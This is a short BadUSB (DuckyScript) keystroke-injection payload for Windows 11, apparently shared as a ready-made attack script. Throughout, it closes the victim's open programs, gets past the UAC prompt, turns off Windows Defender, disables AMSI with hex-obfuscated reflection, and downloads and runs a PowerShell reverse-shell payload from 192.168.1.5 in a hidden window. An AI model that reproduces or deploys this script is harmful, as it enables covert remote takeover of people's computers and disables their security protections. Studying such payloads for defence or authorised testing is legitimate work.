REM Script for reverse shell on Windows 11 Machine
REM Machine needs to be unlocked 
REM User needs administrator privs
REM Stealth Method
REM Refer to readme for attack machine setup

REM Payload Start 
DELAY 3000
REM Short 3 second delay for bad-usb to setup
GUI r
REM Shortcut to open windows run search bar
DELAY 300
STRING cmd 
REM Open CMD
DELAY 400
ENTER
STRING powershell -command "(New-Object -comObject Shell.Application).Windows() | foreach-object {$_.quit()}; Get-Process | Where-Object {$_.MainWindowTitle -ne \"\"} | stop-process"
REM Kill all open processes on the machine. Note: Doesnt kill cmd window
ENTER
STRING exit 
ENTER
GUI r
STRING powershell Start-Process powershell -Verb runAs
REM Run powershell as Administrator
DELAY 100
ENTER
DELAY 1000
ALT TAB
REM Select UAC window once it pops up
DELAY 500
ALT y
REM Bypass UAC window
DELAY 400
STRING Set-MpPreference -DisableIOAVProtection $true
ENTER
STRING Set-MpPreference -DisableRealtimeMonitoring $true
REM Disable Windows Defender
ENTER
DELAY 300
STRING [Ref].Assembly.GetType('System.Management.Automation.'+$("41 6D 73 69 55 74 69 6C 73".Split(" ")|forEach{[char]([convert]::toint16($_,16))}|forEach{$result=$result+$_};$result)).GetField($("61 6D 73 69 49 6E 69 74 46 61 69 6C 65 64".Split(" ")|forEach{[char]([convert]::toint16($_,16))}|forEach{$result2=$result2+$_};$result2),'NonPublic,Static').SetValue($null,$true)
REM Bypass AMSI
DELAY 300
Enter
STRING $Process = IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.1.5/meterman-64.ps1')
REM Download, execute powershell reverseshell payload, and store in $Process
ENTER
STRING powershell -windowstyle hidden $Process 
REM Close Powershell window, keeping process open in the background
ENTER
